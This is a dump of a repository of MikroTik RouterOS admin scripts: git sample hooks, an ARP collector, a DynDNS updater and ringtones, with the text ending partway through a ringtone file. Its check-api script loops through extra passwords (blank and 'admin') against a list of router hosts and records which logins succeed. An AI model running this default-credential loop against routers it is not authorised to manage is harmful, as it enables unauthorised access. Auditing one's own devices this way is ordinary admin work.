# Repository Information
Name: mikrotik-routeros-scripts

# Directory Structure
Directory structure:
└── github_repos/mikrotik-routeros-scripts/
    │   ├── config
    │   ├── description
    │   ├── HEAD
    │   ├── hooks/
    │   │   ├── applypatch-msg.sample
    │   │   ├── commit-msg.sample
    │   │   ├── fsmonitor-watchman.sample
    │   │   ├── post-update.sample
    │   │   ├── pre-applypatch.sample
    │   │   ├── pre-commit.sample
    │   │   ├── pre-merge-commit.sample
    │   │   ├── pre-push.sample
    │   │   ├── pre-rebase.sample
    │   │   ├── pre-receive.sample
    │   │   ├── prepare-commit-msg.sample
    │   │   ├── push-to-checkout.sample
    │   │   └── update.sample
    │   ├── index
    │   ├── info/
    │   │   └── exclude
    │   ├── logs/
    │   │   ├── HEAD
    │   │   └── refs/
    │   │       ├── heads/
    │   │       │   └── master
    │   │       └── remotes/
    │   │           └── origin/
    │   │               └── HEAD
    │   ├── objects/
    │   │   ├── info/
    │   │   └── pack/
    │   │       ├── pack-5a1e1c2498b8a6bc331090b5088628faf0afe6bf.idx
    │   │       └── pack-5a1e1c2498b8a6bc331090b5088628faf0afe6bf.pack
    │   ├── packed-refs
    │   └── refs/
    │       ├── heads/
    │       │   └── master
    │       ├── remotes/
    │       │   └── origin/
    │       │       └── HEAD
    │       └── tags/
    ├── .gitignore
    ├── check-api/
    │   ├── application.conf
    │   ├── boxes.csv
    │   ├── check-api.py
    │   ├── logging.conf
    │   └── README.md
    ├── collect-arp/
    │   ├── application.conf
    │   ├── collect-arp.py
    │   ├── logging.conf
    │   └── README.md
    ├── dyndns-client.rsc
    ├── ringtones/
    │   ├── arkanoid.rsc
    │   ├── mario.rsc
    │   ├── nokia-tune.rsc
    │   ├── popcorn.rsc
    │   ├── README.md
    │   └── tetris.rsc
    ├── run-script-api/
    │   ├── application.conf
    │   ├── boxes.csv
    │   ├── example.api
    │   ├── logging.conf
    │   ├── README.md
    │   └── run-script-api.py
    ├── run-script-ssh/
    │   ├── application.conf
    │   ├── boxes.csv
    │   ├── example.rsc
    │   ├── logging.conf
    │   ├── README.md
    │   └── run-script-ssh.py
    ├── send-leases-to-activemq.rsc
    ├── wan-failover.rsc
    └── wifi-jammer/
        ├── README.md
        └── wifi-jammer.rsc


# Content
File: /.git\config
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
[remote "origin"]
	url = https://github.com/alexanderfefelov/mikrotik-routeros-scripts.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master


File: /.git\description
Unnamed repository; edit this file 'description' to name the repository.


File: /.git\HEAD
ref: refs/heads/master


File: /.git\hooks\applypatch-msg.sample
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:


File: /.git\hooks\commit-msg.sample
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}


File: /.git\hooks\fsmonitor-watchman.sample
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
File: /.git\hooks\post-update.sample
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info


File: /.git\hooks\pre-applypatch.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:


File: /.git\hooks\pre-commit.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --


File: /.git\hooks\pre-merge-commit.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:


File: /.git\hooks\pre-push.sample
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local oid> <remote ref> <remote oid>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')

while read local_ref local_oid remote_ref remote_oid
do
	if test "$local_oid" = "$zero"
	then
		# Handle delete
		:
	else
		if test "$remote_oid" = "$zero"
		then
			# New branch, examine all commits
			range="$local_oid"
		else
			# Update to existing branch, examine new commits
			range="$remote_oid..$local_oid"
		fi

		# Check for WIP commit
		commit=$(git rev-list -n 1 --grep '^WIP' "$range")
		if test -n "$commit"
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0


File: /.git\hooks\pre-rebase.sample
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END


File: /.git\hooks\pre-receive.sample
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi


File: /.git\hooks\prepare-commit-msg.sample
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi


File: /.git\hooks\push-to-checkout.sample
#!/bin/sh

# An example hook script to update a checked-out tree on a git push.
#
# This hook is invoked by git-receive-pack(1) when it reacts to git
# push and updates reference(s) in its repository, and when the push
# tries to update the branch that is currently checked out and the
# receive.denyCurrentBranch configuration variable is set to
# updateInstead.
#
# By default, such a push is refused if the working tree and the index
# of the remote repository has any difference from the currently
# checked out commit; when both the working tree and the index match
# the current commit, they are updated to match the newly pushed tip
# of the branch. This hook is to be used to override the default
# behaviour; however the code below reimplements the default behaviour
# as a starting point for convenient modification.
#
# The hook receives the commit with which the tip of the current
# branch is going to be updated:
commit=$1

# It can exit with a non-zero status to refuse the push (when it does
# so, it must not modify the index or the working tree).
die () {
	echo >&2 "$*"
	exit 1
}

# Or it can make any necessary changes to the working tree and to the
# index to bring them to the desired state when the tip of the current
# branch is updated to the new commit, and exit with a zero status.
#
# For example, the hook can simply run git read-tree -u -m HEAD "$1"
# in order to emulate git fetch that is run in the reverse direction
# with git push, as the two-tree form of git read-tree -u -m is
# essentially the same as git switch or git checkout that switches
# branches while keeping the local changes in the working tree that do
# not interfere with the difference between the branches.

# The below is a more-or-less exact translation to shell of the C code
# for the default behaviour for git's push-to-checkout hook defined in
# the push_to_deploy() function in builtin/receive-pack.c.
#
# Note that the hook will be executed from the repository directory,
# not from the working tree, so if you want to perform operations on
# the working tree, you will have to adapt your code accordingly, e.g.
# by adding "cd .." or using relative paths.

if ! git update-index -q --ignore-submodules --refresh
then
	die "Up-to-date check failed"
fi

if ! git diff-files --quiet --ignore-submodules --
then
	die "Working directory has unstaged changes"
fi

# This is a rough translation of:
#
#   head_has_history() ? "HEAD" : EMPTY_TREE_SHA1_HEX
if git cat-file -e HEAD 2>/dev/null
then
	head=HEAD
else
	head=$(git hash-object -t tree --stdin </dev/null)
fi

if ! git diff-index --quiet --cached --ignore-submodules $head --
then
	die "Working directory has staged changes"
fi

if ! git read-tree -u -m "$commit"
then
	die "Could not update working tree to new HEAD"
fi


File: /.git\hooks\update.sample
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0


File: /.git\info\exclude
File: /.git\logs\HEAD
0000000000000000000000000000000000000000 4de420da4c4757f421f6ed279b5882af7ffef618 vivek-dodia <vivek.dodia@icloud.com> 1738605802 -0500	clone: from https://github.com/alexanderfefelov/mikrotik-routeros-scripts.git


File: /.git\logs\refs\heads\master
0000000000000000000000000000000000000000 4de420da4c4757f421f6ed279b5882af7ffef618 vivek-dodia <vivek.dodia@icloud.com> 1738605802 -0500	clone: from https://github.com/alexanderfefelov/mikrotik-routeros-scripts.git


File: /.git\logs\refs\remotes\origin\HEAD
0000000000000000000000000000000000000000 4de420da4c4757f421f6ed279b5882af7ffef618 vivek-dodia <vivek.dodia@icloud.com> 1738605802 -0500	clone: from https://github.com/alexanderfefelov/mikrotik-routeros-scripts.git


File: /.git\packed-refs
# pack-refs with: peeled fully-peeled sorted 
4de420da4c4757f421f6ed279b5882af7ffef618 refs/remotes/origin/master


File: /.git\refs\heads\master
4de420da4c4757f421f6ed279b5882af7ffef618


File: /.git\refs\remotes\origin\HEAD
ref: refs/remotes/origin/master


File: /.gitignore
.vscode
File: /check-api\application.conf
[application]

timeout=1

additional_usernames=
additional_passwords=,admin

boxes_csv=boxes.csv

success_out=success.out
unable_to_login_out=unable_to_login.out


File: /check-api\boxes.csv
host,username,password
192.168.10.1,admin,password
192.168.11.1,admin,password
192.168.12.1,admin,


File: /check-api\check-api.py
#!/usr/bin/env python

from datetime import datetime
from librouteros import connect  # https://github.com/luqasz/librouteros
import ConfigParser
import csv
import json
import logging
import logging.config
import os
import os.path
import sys


def main():
    home = os.path.dirname(os.path.abspath(__file__))
    os.chdir(home)

    config = ConfigParser.RawConfigParser()
    config.read('application.conf')
    timeout = float(config.get('application', 'timeout'))
    additional_usernames = filter(None, config.get('application', 'additional_usernames').split(','))
    additional_passwords = config.get('application', 'additional_passwords').split(',')
    boxes_csv = config.get('application', 'boxes_csv')
    success_out = config.get('application', 'success_out')
    unable_to_login_out = config.get('application', 'unable_to_login_out')

    logging.config.fileConfig('logging.conf')

    boxes = []
    with open(boxes_csv, 'rb') as f:
        reader = csv.DictReader(f)
        fieldnames = reader.fieldnames
        for r in reader:
            boxes.append({fieldnames[i]: r[fieldnames[i]] for i in range(len(fieldnames))})
    logging.info('%d box(es) will be checked', len(boxes))

    WRITE_BUFFER_SIZE = 0
    with open(success_out, 'wb', WRITE_BUFFER_SIZE) as success_out_f, open(unable_to_login_out, 'wb', WRITE_BUFFER_SIZE) as unable_to_login_out_f:
        success_out_writer = csv.writer(success_out_f)
        unable_to_login_out_writer = csv.writer(unable_to_login_out_f)

        processed = 0
        for box in boxes:
            host = box['host']
            username = box['username']
            password = box['password']

            usernames = [username] + additional_usernames
            passwords = [password] + additional_passwords

            logging.info('Processing %s', host)
            for u in usernames:
                for p in passwords:
                    try:
                        api = connect(host=host, username=u, password=p, timeout=timeout)
                        identity = api(cmd='/system/identity/print')[0]['name']
                        api.close()
                        success_out_writer.writerow((host, u, p, identity))
                        logging.info("Success")
                        break
                    except:
                        _, exc_value, _ = sys.exc_info()
                        logging.error(exc_value)
                        if (str(exc_value) != "cannot log in"):
                            break
                else:
                    continue
                break
            else:
                unable_to_login_out_writer.writerow([host])
            logging.info('%s done', host)
            processed += 1
            if (processed % 50 == 0):
                logging.info('%d boxes processed', processed)
        logging.info('Total %d box(es) processed', processed)


if __name__ == '__main__':
    main()


File: /check-api\logging.conf
[loggers]
keys=root

[handlers]
keys=consoleHandler,rotateFileHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=rotateFileHandler

[handler_consoleHandler]
class=StreamHandler
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[handler_rotateFileHandler]
class=handlers.RotatingFileHandler
level=DEBUG
formatter=simpleFormatter
args=('check-api.log', 'a', 'maxBytes=10000000','backupCount=5', 'utf8')

[formatter_simpleFormatter]
format=%(asctime)s %(levelname)s %(message)s
datefmt=%Y-%m-%d %H:%M:%S


File: /check-api\README.md
# check-api

This script checks RouterOS [API](https://wiki.mikrotik.com/wiki/Manual:API) connectivity and credentials.

## How to use

Install dependencies:

    pip install librouteros

Fill up the [`boxes.csv`](boxes.csv) file.

Revise the [`application.conf`](application.conf) file.

Run:

    check-api.py

Check out the `success.out` and `unable_to_login.out` files.


File: /collect-arp\application.conf
[application]

out_dir=/tmp

timeout=1

boxes_json=[
        {"host": "192.168.10.1", "username": "admin", "password": "admin"},
        {"host": "192.168.11.1", "username": "admin", "password": "admin"},
        {"host": "192.168.12.1", "username": "admin", "password": "admin"}
    ]


File: /collect-arp\collect-arp.py
#!/usr/bin/env python

from datetime import datetime
from librouteros import connect  # https://github.com/luqasz/librouteros
import ConfigParser
import gzip
import json
import logging
import logging.config
import os
import sys


def setup_encoding():  # https://stackoverflow.com/a/40346898
    reload(sys)
    sys.setdefaultencoding('latin-1')


def main():
    home = os.path.dirname(os.path.abspath(__file__))
    os.chdir(home)

    config = ConfigParser.RawConfigParser()
    config.read('application.conf')
    out_dir = config.get('application', 'out_dir')
    timeout = float(config.get('application', 'timeout'))
    boxes = json.loads(config.get('application', 'boxes_json'))

    logging.config.fileConfig('logging.conf')

    setup_encoding()

    for box in boxes:
        host = box['host']
        username = box['username']
        password = box['password']

        try:
            logging.info('Processing %s', host)
            api = connect(host=host, username=username, password=password, timeout=timeout)
            entries = api(cmd='/ip/arp/print')
            api.close()
            data = set([(entry['mac-address'], entry['interface']) for entry in entries if 'mac-address' in entry])
            file_name = datetime.now().strftime('%Y%m%d%H%M%S') + '-' + host + '.gz'
            file_path = os.path.join(out_dir, file_name)
            with gzip.open(file_path, 'wb') as file:
                for obj in data:
                    file.write(' '.join(obj) + '\n')
            logging.info('%s done', host)
        except:
            _, exc_value, _ = sys.exc_info()
            logging.error(exc_value)


if __name__ == '__main__':
    main()


File: /collect-arp\logging.conf
[loggers]
keys=root

[handlers]
keys=consoleHandler,rotateFileHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=rotateFileHandler

[handler_consoleHandler]
class=StreamHandler
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[handler_rotateFileHandler]
class=handlers.RotatingFileHandler
level=DEBUG
formatter=simpleFormatter
args=('collect-arp.log', 'a', 'maxBytes=10000000','backupCount=5', 'utf8')

[formatter_simpleFormatter]
format=%(asctime)s %(levelname)s %(message)s
datefmt=%Y-%m-%d %H:%M:%S


File: /collect-arp\README.md
# collect-arp

This script collects ARP table from a bunch of RouterOS routers.


File: /dyndns-client.rsc
#-------------------------------------------------------------------------------
# MikroTik RouterOS DynDNS Update Client
#-------------------------------------------------------------------------------

#-------------------------------------------------------------------------------
# Settings
#-------------------------------------------------------------------------------
:local DYNDNSUSER "user"
:local DYNDNSPASSWORD "password"
:local DYNDNSHOSTNAME "host.dyndns.info"
:local EXTERNALINTERFACE "ether1"

#-------------------------------------------------------------------------------
# Update
#-------------------------------------------------------------------------------
:local currentIp [/ip address get [/ip address find interface=$EXTERNALINTERFACE] address]
:set currentIp [:pick $currentIp 0 [: find $currentIp "/"]]
:local oldIp [:resolve $DYNDNSHOSTNAME]
:if ($currentIp != $oldIp) do={
  :local addr "members.dyndns.org"
  :local srcPath "/nic/update?hostname=$DYNDNSHOSTNAME&myip=$currentIp&wildcard=NOCHG&mx=NOCHG&backmx=NOCHG"
  :local dstPath "dyndns.txt"
  /tool fetch address=$addr src-path=$srcPath mode=https user=$DYNDNSUSER password=$DYNDNSPASSWORD dst-path=$dstPath keep-result=no
  :log info "DynDNS updated: $DYNDNSHOSTNAME $oldIp -> $currentIp"
}


File: /ringtones\arkanoid.rsc
#-------------------------------------------------------------------------------
# MikroTik RouterOS Ringtone: Arkanoid
#
# Created with RTTTL to MikroTik RouterOS Script Generator
# https://arktronic.github.io/mikrotik-scripts/rtttl.html
#-------------------------------------------------------------------------------

:beep frequency=1568 length=214ms;
:delay 224ms;
:delay 107ms;

:beep frequency=1568 length=161ms;
:delay 171ms;
:beep frequency=1865 length=857ms;
:delay 867ms;
:delay 54ms;

:beep frequency=1760 length=214ms;
:delay 224ms;
:beep frequency=1568 length=214ms;
:delay 224ms;
:beep frequency=1397 length=214ms;
:delay 224ms;
:beep frequency=1760 length=214ms;
:delay 224ms;
:beep frequency=1568 length=857ms;
:delay 867ms;


File: /ringtones\mario.rsc
#-------------------------------------------------------------------------------
# MikroTik RouterOS Ringtone: Mario
#
# Created with RTTTL to MikroTik RouterOS Script Generator
# https://arktronic.github.io/mikrotik-scripts/rtttl.html
#-------------------------------------------------------------------------------

:beep frequency=1319 length=150ms;
:delay 160ms;
:beep frequency=1319 length=150ms;
:delay 160ms;
:delay 75ms;

:beep frequency=1319 length=300ms;
:delay 310ms;
:beep frequency=1047 length=150ms;
:delay 160ms;
:beep frequency=1319 length=300ms;
:delay 310ms;
:beep frequency=1568 length=300ms;
:delay 310ms;
:delay 300ms;

:beep frequency=784 length=300ms;
:delay 310ms;
:delay 300ms;

:beep frequency=1047 length=300ms;
:delay 310ms;
:delay 150ms;

:beep frequency=784 length=300ms;
:delay 310ms;
:delay 150ms;

:beep frequency=659 length=300ms;
:delay 310ms;
:delay 150ms;

:beep frequency=880 length=300ms;
:delay 310ms;
:beep frequency=988 length=300ms;
:delay 310ms;
:beep frequency=932 length=150ms;
:delay 160ms;
:beep frequency=880 length=300ms;
:delay 310ms;
:beep frequency=784 length=225ms;
:delay 235ms;
:beep frequency=1319 length=150ms;
:delay 160ms;
:beep frequency=1568 length=150ms;
:delay 160ms;
:beep frequency=1760 length=300ms;
:delay 310ms;
:beep frequency=1397 length=150ms;
:delay 160ms;
:beep frequency=1568 length=300ms;
:delay 310ms;
:beep frequency=1319 length=300ms;
:delay 310ms;
:beep frequency=1047 length=150ms;
:delay 160ms;
:beep frequency=1175 length=150ms;
:delay 160ms;
:beep frequency=988 length=300ms;
:delay 310ms;
:delay 150ms;

:beep frequency=1047 length=300ms;
:delay 310ms;
:delay 150ms;

:beep frequency=784 length=300ms;
:delay 310ms;
:delay 150ms;

:beep frequency=659 length=300ms;
:delay 310ms;
:delay 150ms;

:beep frequency=880 length=300ms;
:delay 310ms;
:beep frequency=988 length=300ms;
:delay 310ms;
:beep frequency=932 length=150ms;
:delay 160ms;
:beep frequency=880 length=300ms;
:delay 310ms;
:beep frequency=784 length=225ms;
:delay 235ms;
:beep frequency=1319 length=150ms;
:delay 160ms;
:beep frequency=1568 length=150ms;
:delay 160ms;
:beep frequency=1760 length=300ms;
:delay 310ms;
:beep frequency=1397 length=150ms;
:delay 160ms;
:beep frequency=1568 length=300ms;
:delay 310ms;
:beep frequency=1319 length=300ms;
:delay 310ms;
:beep frequency=1047 length=150ms;
:delay 160ms;
:beep frequency=1175 length=150ms;
:delay 160ms;
